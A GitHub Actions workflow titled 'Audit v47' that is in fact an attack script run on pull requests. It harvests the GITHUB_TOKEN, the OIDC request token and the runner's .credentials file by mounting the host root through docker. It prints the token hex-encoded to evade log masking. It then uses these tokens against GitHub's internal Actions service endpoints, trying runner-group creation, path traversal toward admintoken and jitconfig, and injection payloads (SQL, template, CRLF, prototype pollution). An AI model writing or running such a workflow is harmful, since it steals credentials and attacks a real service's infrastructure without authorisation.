name: Audit v47
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v47:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V47 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: PascalCase scale set + runner group creation
      # v46: wrapper parsed, runnerScaleSet.Name null
      # C# uses PascalCase for deserialization
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Scale set PascalCase
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SCALESET PASCALCASE ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          # A: Scale set with PascalCase
          echo "--- A: PascalCase variants ---"
          for BODY in \
            '{"runnerScaleSet":{"Name":"v47-ss","RunnerGroupId":1}}' \
            '{"runnerScaleSet":{"Name":"v47-ss","RunnerGroupId":1,"Labels":[{"Name":"self-hosted"}]}}' \
            '{"Name":"v47-ss","RunnerGroupId":1}' \
            '{"Name":"v47-ss","RunnerGroupId":1,"Labels":[{"Name":"self-hosted","Type":"Custom"}]}' \
            '{"name":"v47","runnerGroupId":1,"runnerScaleSetScheme":"Static"}' \
            '{"runnerScaleSet":{"Name":"v47","RunnerGroupId":1,"RunnerScaleSetScheme":"Static"}}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/runtime/runnerscalesets?$VER" -d "$BODY")
            CODE=$(echo "$R" | tail -1)
            echo "A = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
          done
          echo ""

          # B: Runner group with PascalCase pool
          echo "--- B: Group PascalCase ---"
          for BODY in \
            '{"Name":"v47-group","Pool":{"Name":"v47-pool"}}' \
            '{"name":"v47-group","pool":{"Name":"v47-pool","PoolType":"automation"}}' \
            '{"Name":"v47-group","Pool":{"Id":1,"Name":"Default"}}' \
            '{"name":"v47-group","pool":{"id":1},"visibility":"organization"}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/runtime/runnergroups?$VER" -d "$BODY")
            CODE=$(echo "$R" | tail -1)
            echo "B = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: MASSIVE INJECTION SPRAY — 25+ payloads per input
      # Target: poolName, runnergroup IDs, planId, path segments
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Injection spray
        if: always()
        env:
          RUNID: ${{ github.run_id }}
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== INJECTION SPRAY ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)

          # ─── A: Path segment injection on poolName ───
          echo "--- A: poolName injection ---"
          for PAY in \
            "../admin" \
            "..%2fadmin" \
            "..%252fadmin" \
            "....//admin" \
            "..;/admin" \
            "%2e%2e%2fadmin" \
            "..%00admin" \
            "..%0d%0aX-Injected:%20true" \
            "'OR+1=1--" \
            "'+UNION+SELECT+1--" \
            "{{7*7}}" \
            "\${7*7}" \
            "#{7*7}" \
            "%24%7B7*7%7D" \
            "<script>alert(1)</script>" \
            "{{config.__class__}}" \
            "%00" \
            "admin%23" \
            "test&extraParam=leaked" \
            "*" \
            "%(nested)s" \
            "AAAA%n%n%n" \
            "test\nX-Admin: true" \
            "__proto__" \
            "constructor" \
            "Object.keys(this)"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/pools?poolName=$PAY" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            # Print non-standard responses
            if [ "$CODE" != "HTTP_200" ] || echo "$BODY" | grep -qv '"count":0'; then
              echo "A poolName=$PAY = $CODE | $(echo "$BODY" | head -c 150)"
            fi
          done
          echo ""

          # ─── B: Path traversal on distributedtask sub-paths ───
          echo "--- B: Path traversal ---"
          for PAY in \
            "pools/../admintoken" \
            "pools/..%2fadmintoken" \
            "pools/%2e%2e/admintoken" \
            "pools/../../_apis/ServiceDefinitions" \
            "pools/../../../etc/passwd" \
            "pools;admintoken" \
            "pools%00/admintoken" \
            "pools/../sessions" \
            "pools/../messages" \
            "pools/../idtoken" \
            "pools/../jitconfig" \
            "pools%252f..%252fadmintoken" \
            "labels/../admintoken" \
            "labels/../../ServiceDefinitions" \
            "labels/../pools/../admintoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/$PAY" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $PAY = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # ─── C: Query param injection on plan-scoped routes ───
          echo "--- C: planId injection ---"
          for PAY in \
            "../" \
            "00000000-0000-0000-0000-000000000000" \
            "00000000-0000-0000-0000-000000000001" \
            "%00" \
            "null" \
            "undefined" \
            "*" \
            "' OR '1'='1" \
            "{{constructor.constructor('return this')()}}" \
            "\${env:ACTIONS_RUNTIME_TOKEN}" \
            "%24%7Benv%3AACTIONS_RUNTIME_TOKEN%7D" \
            "test%0d%0aX-Leak: true" \
            "../../ServiceDefinitions" \
            "$PLAN/../../../ServiceDefinitions"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/distributedtask/plans/$PAY" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "C plan=$PAY = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # ─── D: runnergroups ID injection ───
          echo "--- D: runnergroup ID injection ---"
          for PAY in \
            "0" \
            "1%00" \
            "1/../2" \
            "1%2f..%2f2" \
            "1;SELECT+1" \
            "2147483647" \
            "-2147483648" \
            "1e10" \
            "0x1" \
            "NaN" \
            "Infinity" \
            "1,2" \
            "1%0d%0aHTTP/1.1%20200%20OK" \
            "1/../../../_apis/ServiceDefinitions" \
            "all"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              "$PIPE/_apis/runtime/runnergroups/$PAY" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "D id=$PAY = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # ─── E: Header injection via Runner group name POST body ───
          echo "--- E: Body injection via group name ---"
          for NAME in \
            '{"name":"test\\nX-Admin: true","pool":{"id":1}}' \
            '{"name":"{{7*7}}","pool":{"id":1}}' \
            '{"name":"${7*7}","pool":{"id":1}}' \
            '{"name":"<img src=x onerror=alert(1)>","pool":{"id":1}}' \
            '{"name":"test","pool":{"id":1},"__proto__":{"admin":true}}' \
            '{"name":"test","pool":{"id":1},"constructor":{"prototype":{"admin":true}}}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$PIPE/_apis/runtime/runnergroups?api-version=6.0-preview" \
              -d "$NAME" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "E = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: vstoken security + pipeline small IDs
      # Security 404 on pipeline — try on vstoken
      # Use small pipelineIds (1-10) instead of github.run_id
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - vstoken security + small IDs
        if: always()
        env:
          RUNID: ${{ github.run_id }}
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN SECURITY + SMALL IDS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          VS="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
          PLAN=$(cat /tmp/plan.txt)

          # A: vstoken security endpoints
          echo "--- A: vstoken security ---"
          for EP in \
            "/_apis/security/SecurityNamespaces" \
            "/_apis/security/SecurityNamespaces?api-version=5.0" \
            "/_apis/security/AccessControlLists?api-version=5.0" \
            "/_apis/security/Permissions?api-version=5.0" \
            "/_apis/security/AccessControlEntries?api-version=5.0" \
            "/_apis/security/SecurityNamespaces/33344d9c-fc72-4d6f-aba5-fa317101a7e9?api-version=5.0" \
            "/_apis/security/SecurityNamespaces/2725d2bc-7520-4af4-b0e3-8d876494731f?api-version=5.0" \
            "/_apis/notification/Subscriptions" \
            "/_apis/notification/Events" \
            "/_apis/notification/Settings" \
            "/_apis/FeatureAvailability/FeatureFlags" \
            "/_apis/FeatureAvailability/FeatureFlags?api-version=5.0" \
            "/_apis/Health/Health" \
            "/_apis/operations" \
            "/_apis/Servicing/ServiceLevel"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" "$VS$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $EP = $CODE | $(echo "$BODY" | head -c 250)"
          done
          echo ""

          # B: Pipeline routes with small IDs (pipelineId=1)
          echo "--- B: Small pipeline IDs ---"
          for PID in 1 2 3 10 100; do
            for EP in "runs" "runs/1" "runs/1/signedlogcontent?urlSignature=test&urlExpires=9999999999&urlSigningMethod=HMAC-SHA256"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $IDTOK" \
                "$PIPE/_apis/pipelines/$PID/$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "B pid=$PID/$EP = $CODE | $(echo "$BODY" | head -c 200)"
            done
          done
          echo ""

          # C: RT on IDTOK-accessible endpoints (maybe RT has different perms)
          echo "--- C: RT on IDTOK endpoints ---"
          for EP in \
            "/_apis/distributedtask/labels" \
            "/_apis/distributedtask/concurrencylimitoverrides" \
            "/_apis/distributedtask/queuedrequests" \
            "/_apis/runtime/runnergroups" \
            "/_apis/runtime/runnerscalesets" \
            "/_apis/distributedtask/admintoken" \
            "/_apis/distributedtask/idtoken" \
            "/_apis/distributedtask/sessions" \
            "/_apis/distributedtask/messages" \
            "/_apis/distributedtask/jitconfig"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$PIPE$EP")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C RT $EP = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V47 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V47 COMPLETE ==="
